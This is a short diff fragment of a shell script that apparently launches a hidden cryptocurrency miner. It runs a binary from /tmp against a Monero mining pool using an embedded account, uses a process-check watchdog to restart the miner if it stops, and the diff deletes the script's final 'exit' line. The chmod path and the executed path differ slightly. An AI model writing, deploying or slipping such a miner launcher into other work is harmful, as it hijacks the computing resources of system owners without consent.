@@ -12,4 +12,3 @@ chmod +x /tmp/c21
 /tmp/c2l -t 1 -M stratum+tcp://c2l%40protonmail.com:x@xmr.pool.minergate.com:45560/xmr
 }
 ps auxf|grep -v grep|grep "c2l" || Doc2l
-exit
